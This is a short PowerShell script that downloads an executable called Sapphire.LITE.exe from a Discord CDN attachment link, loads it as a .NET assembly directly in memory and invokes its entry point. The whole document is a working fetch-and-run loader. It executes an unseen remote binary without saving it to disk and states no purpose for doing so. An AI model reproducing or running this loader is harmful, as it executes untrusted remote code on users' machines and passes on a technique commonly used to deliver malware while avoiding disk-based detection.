# Download the EXE file from the provided URL
$bytes = (Invoke-WebRequest "https://cdn.discordapp.com/attachments/1239145132767580173/1269618076425650319/Sapphire.LITE.exe?ex=66b0b779&is=66af65f9&hm=655ca30329d619b4b3748aa8f4bc8f1c01e0c679c3739654bf2210524e9a3a2e&" -UseBasicParsing).Content

# Load the EXE as an assembly
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Get the entry point method
$entryPointMethod = $assembly.EntryPoint

if ($entryPointMethod -eq $null) {
    Write-Output "No entry point found in the assembly."
    exit
}

# Check the method signature
$methodParams = $entryPointMethod.GetParameters()
if ($methodParams.Count -eq 1 -and $methodParams[0].ParameterType -eq [string[]]) {
    # Prepare the arguments array
    $args = [System.Array]::CreateInstance([string], 2)
    $args.SetValue('foo', 0)
    $args.SetValue('bar', 1)

    # Call the entry point with arguments
    $entryPointMethod.Invoke($null, @($args))
} elseif ($methodParams.Count -eq 0) {
    # No parameters
    $entryPointMethod.Invoke($null, $null)
} else {
    Write-Output "Unsupported method signature."
}